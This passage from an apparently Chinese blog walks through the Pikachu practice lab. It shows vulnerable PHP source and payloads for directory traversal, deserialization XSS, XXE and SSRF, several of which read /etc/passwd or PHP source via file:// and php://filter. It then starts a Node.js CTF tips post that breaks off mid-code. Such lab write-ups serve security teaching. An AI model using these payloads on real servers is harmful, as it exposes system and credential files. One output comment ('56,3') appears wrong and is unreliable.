double-quoted-string">"location:op2_login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token constant">null</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//用户名密码必填</span>        <span class="token variable">$getdata</span><span class="token operator">=</span><span class="token function">escape</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//转义</span>        <span class="token variable">$query</span><span class="token operator">=</span><span class="token string double-quoted-string">"insert into member(username,pw,sex,phonenum,email,address) values('<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$getdata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>',md5('<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$getdata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>'),'<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$getdata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sex'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>','<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$getdata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phonenum'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>','<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$getdata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>','<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$getdata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'address'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>')"</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysqli_affected_rows</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//判断是否插入</span>            <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:op2_admin.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id=""><a href="#" class="headerlink" title="../../"></a>../../</h2><h3 id="概述-9"><a href="#概述-9" class="headerlink" title="概述"></a>概述</h3><p>在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“../”这样的手段让后台打开或者执行一些其他的文件。从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞</p><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><pre class="line-numbers language-none"><code class="language-none">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/04/09/FEQ2dUNXRW6kmBh.png"></p><p><strong>源码</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//这里直接把传进来的内容进行了require(),造成问题</span>    <span class="token keyword">require</span> <span class="token string double-quoted-string">"soup/<span class="token interpolation"><span class="token variable">$filename</span></span>"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><h3 id="概述-10"><a href="#概述-10" class="headerlink" title="概述"></a>概述</h3><p>由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到</p><h3 id="IcanseeyourABC"><a href="#IcanseeyourABC" class="headerlink" title="IcanseeyourABC"></a>IcanseeyourABC</h3><p>前端源码存在测试账户信息</p><p><img src="https://s2.loli.net/2022/04/09/BjNAqyn67oHIETX.png"></p><h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><h3 id="概述-11"><a href="#概述-11" class="headerlink" title="概述"></a>概述</h3><p>**序列化serialize()**：序列化说通俗点就是把一个对象变成可以传输的字符串</p><p>**反序列化unserialize()**：就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用</p><p>序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题</p><p>常见的几个魔法函数:</p><ul><li>__construct() 当一个对象创建时被调用 </li><li>__destruct() 当一个对象销毁时被调用 </li><li>__toString() 当一个对象被当作一个字符串使用</li><li>__sleep() 在对象在被序列化之前运行 </li><li>__wakeup 将在序列化之后立即被调用</li></ul><h3 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h3><p>构造序列化</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">S</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$test</span><span class="token operator">=</span><span class="token string double-quoted-string">"&lt;script>alert(1)&lt;/script>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$s</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">S</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//创建一个对象</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//把这个对象进行序列化</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行php得到序列化字符串</p><p><img src="https://s2.loli.net/2022/04/09/zyEACDnBOo3wjL4.png"></p><p>反序列化执行js</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"S"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">25</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"&lt;script>alert(1)&lt;/script>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们输入的序列化字符串经过处理被输出到当前html页面中</p><p><img src="https://s2.loli.net/2022/04/09/yKF4W29EzmsBwAc.png"></p><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="概述-12"><a href="#概述-12" class="headerlink" title="概述"></a>概述</h3><p>XXE -“xml external entity injection”，既”xml外部实体注入漏洞”<br>概括一下就是”攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题”也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入</p><p>现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞<br>以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的</p><h3 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h3><p><strong>源码</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$data</span> <span class="token operator">=</span> @<span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$xml</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'SimpleXMLElement'</span><span class="token punctuation">,</span><span class="token constant">LIBXML_NOENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$html</span><span class="token operator">.=</span><span class="token string double-quoted-string">"&lt;pre><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$data</span><span class="token punctuation">&#125;</span></span>&lt;/pre>"</span><span class="token punctuation">;</span><span class="token operator">...</span><span class="token comment">//简单的看一下simplexml_load_string函数</span><span class="token comment">/** * Interprets a string of XML into an object * @link https://php.net/manual/en/function.simplexml-load-string.php * @param string $data &lt;p> * A well-formed XML string * &lt;/p> * @param string|null $class_name [optional] &lt;p> * You may use this optional parameter so that * &lt;b>simplexml_load_string&lt;/b> will return an object of * the specified class. That class should extend the * SimpleXMLElement class. * &lt;/p> * @param int $options [optional] &lt;p> * Since PHP 5.1.0 and Libxml 2.6.0, you may also use the * &lt;i>options&lt;/i> parameter to specify additional Libxml parameters. * &lt;/p> * @param string $namespace_or_prefix [optional] &lt;p> * Namespace prefix or URI. * &lt;/p> * @param bool $is_prefix [optional] &lt;p> * &lt;b>TRUE&lt;/b> if &lt;i>ns&lt;/i> is a prefix, &lt;b>FALSE&lt;/b> if it's a URI; * defaults to &lt;b>FALSE&lt;/b>. * &lt;/p> * @return SimpleXMLElement|false an object of class SimpleXMLElement with * properties containing the data held within the xml document, or &lt;b>FALSE&lt;/b> on failure. */</span><span class="token keyword">function</span> <span class="token function-definition function">simplexml_load_string</span> <span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token keyword type-hint">string</span> <span class="token variable">$class_name</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SimpleXMLElement"</span><span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$namespace_or_prefix</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token keyword type-hint">bool</span> <span class="token variable">$is_prefix</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name">SimpleXMLElement</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">//大致意思就是处理xml格式的文件数据</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造伪协议读取文件</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span><span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY f SYSTEM "file:///etc/passwd"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&f;">&amp;f;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/04/10/G81gxqrsVRL2ic7.png"></p><h2 id="URL重定向"><a href="#URL重定向" class="headerlink" title="URL重定向"></a>URL重定向</h2><h3 id="概述-13"><a href="#概述-13" class="headerlink" title="概述"></a>概述</h3><p>不安全的url跳转问题可能发生在一切执行了url地址跳转的地方。<br>如果后端采用了前端传进来的(可能是用户传参,或者之前预埋在前端页面的url地址)参数作为了跳转的目的地,而又没有做判断的话就可能发生”跳错对象”的问题。</p><p>url跳转比较直接的危害是:<br>–&gt;钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站</p><h3 id="不安全的URL跳转"><a href="#不安全的URL跳转" class="headerlink" title="不安全的URL跳转"></a>不安全的URL跳转</h3><p>url= 处添加网址</p><pre class="line-numbers language-none"><code class="language-none">?url&#x3D;http:&#x2F;&#x2F;www.baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/04/10/O6LEp8WFKvV7ydw.png"></p><p>执行后会跳转到<a href="http://www.baidu.com/">www.baidu.com</a></p><p><strong>源码</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//对输入的url没有做外部跳转的过滤或者是黑白名单的限制</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$url</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'i'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$html</span><span class="token operator">.=</span><span class="token string double-quoted-string">"&lt;p>好的,希望你能坚持做你自己!&lt;/p>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token comment">//跳转到用户指定的url</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$url</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="概述-14"><a href="#概述-14" class="headerlink" title="概述"></a>概述</h3><p><strong>SSRF(Server-Side Request Forgery:服务器端请求伪造)</strong></p><p>其形成的原因大都是由于服务端<strong>提供了从其他服务器应用获取数据的功能</strong>,但又没有对目标地址做严格过滤与限制</p><p>导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据<br>数据流:攻击者—–&gt;服务器—-&gt;目标地址</p><p>根据后台使用的函数的不同,对应的影响和利用方法又有不一样            </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">PHP</span>中下面函数的使用不当会导致<span class="token constant">SSRF</span><span class="token punctuation">:</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如果一定要通过后台服务器远程去对用户指定(“或者预埋在前端的请求”)的地址进行资源请求,<strong>则请做好目标地址的过滤</strong></p><h3 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF(curl)"></a>SSRF(curl)</h3><p>可以利用FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP等协议</p><pre class="line-numbers language-none"><code class="language-none">file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以做内网端口扫描</p><p><img src="https://s2.loli.net/2022/04/10/PmiDWS28a1Tlusx.png"></p><p><strong>源码</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF</span>    <span class="token variable">$URL</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$CH</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$URL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$CH</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$CH</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_SSL_VERIFYPEER</span><span class="token punctuation">,</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$RES</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$CH</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$CH</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token comment">//ssrf的问是:前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端。</span><span class="token comment">//除了http/https外,curl还支持一些其他的协议curl --version 可以查看其支持的协议,telnet</span><span class="token comment">//curl支持很多协议，有FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="SSRF-file-get-content"><a href="#SSRF-file-get-content" class="headerlink" title="SSRF(file_get_content)"></a>SSRF(file_get_content)</h3><pre class="line-numbers language-none"><code class="language-none">.&#x2F;ssrf_info&#x2F;info1.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>file_get_contents() 函数把整个文件读入一个字符串中</p><p>如果pikachu这台服务器所处的内网还有另一台不想被访问的服务器，那么可以使用该漏洞进行请求另一台服务器的资源<br>这里就随便读取本地的一个文件</p><p><strong>源码</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//读取PHP文件的源码:php://filter/read=convert.base64-encode/resource=ssrf.php</span><span class="token comment">//内网请求:http://x.x.x.x/xx.index</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span> <span class="token operator">!=</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf-nodejs之一些小知识</title>
      <link href="/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/"/>
      <url>/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/</url>
      
        <content type="html"><![CDATA[<p>我也是非常有幸能为大家去讲解CTF中nodejs的一些小知识，关于ctf-web系列课程已经在bilibili陆续发布 <a href="https://www.bilibili.com/video/BV1uL411P7xt/">https://www.bilibili.com/video/BV1uL411P7xt/</a> ，大家在有什么疑问可以随时在评论区留言哦~</p><h2 id="1-nodejs基础"><a href="#1-nodejs基础" class="headerlink" title="1 nodejs基础"></a>1 nodejs基础</h2><h3 id="1-1-nodejs的简单介绍"><a href="#1-1-nodejs的简单介绍" class="headerlink" title="1.1 nodejs的简单介绍"></a>1.1 nodejs的简单介绍</h3><p>简单的说 Node.js 就是运行在服务端的 JavaScript。<br>Node.js 是一个基于Chrome JavaScript 运行时建立的一个平台。<br>Node.js是一个事件驱动I/O服务端JavaScript环境，基于Google的V8引擎，V8引擎执行Javascript的速度非常快，性能非常好。</p><p><a href="https://www.runoob.com/nodejs/nodejs-tutorial.html">nodejs语法学习</a></p><h3 id="1-2-nodejs语言的缺点"><a href="#1-2-nodejs语言的缺点" class="headerlink" title="1.2 nodejs语言的缺点"></a>1.2 nodejs语言的缺点</h3><h4 id="1-2-1-大小写特性"><a href="#1-2-1-大小写特性" class="headerlink" title="1.2.1 大小写特性"></a>1.2.1 大小写特性</h4><p>toUpperCase()<br>toLowerCase()</p><p>对于toUpperCase(): 字符<code>&quot;ı&quot;</code>、<code>&quot;ſ&quot;</code> 经过toUpperCase处理后结果为 <code>&quot;I&quot;</code>、<code>&quot;S&quot;</code><br>对于toLowerCase(): 字符<code>&quot;K&quot;</code>经过toLowerCase处理后结果为<code>&quot;k&quot;</code>(这个K不是K)</p><h4 id="1-2-2-弱类型比较"><a href="#1-2-2-弱类型比较" class="headerlink" title="1.2.2 弱类型比较"></a>1.2.2 弱类型比较</h4><p><strong>大小比较</strong></p><pre class="line-numbers language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//true </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">></span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//false </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token operator">&lt;</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//true </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">111</span><span class="token operator">></span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//true </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'111'</span><span class="token operator">></span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//false </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'asd'</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>总结：数字与字符串比较时，会优先将纯数字型字符串转为数字之后再进行比较；而字符串与字符串比较时，会将字符串的第一个字符转为ASCII码之后再进行比较，因此就会出现第五行代码的这种情况；而非数字型字符串与任何数字进行比较都是false</p><p><em>数组的比较：</em></p><pre class="line-numbers language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//false </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//false</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//true </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//true </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//true </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token string">"10"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>总结：空数组之间比较永远为false，数组之间比较只比较数组间的第一个值，对第一个值采用前面总结的比较方法，数组与非数值型字符串比较，数组永远小于非数值型字符串；数组与数值型字符串比较，取第一个之后按前面总结的方法进行比较</p><p><em>还有一些比较特别的相等：</em></p><pre class="line-numbers language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token operator">==</span><span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token comment">// 输出：true </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token operator">===</span><span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token comment">// 输出：false </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">NaN</span><span class="token operator">==</span><span class="token number">NaN</span><span class="token punctuation">)</span>  <span class="token comment">// 输出：false </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">NaN</span><span class="token operator">===</span><span class="token number">NaN</span><span class="token punctuation">)</span>  <span class="token comment">// 输出：false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>变量拼接</strong></p><pre class="line-numbers language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//56,3 </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"5"</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//56 </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"5"</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//56,6 </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token 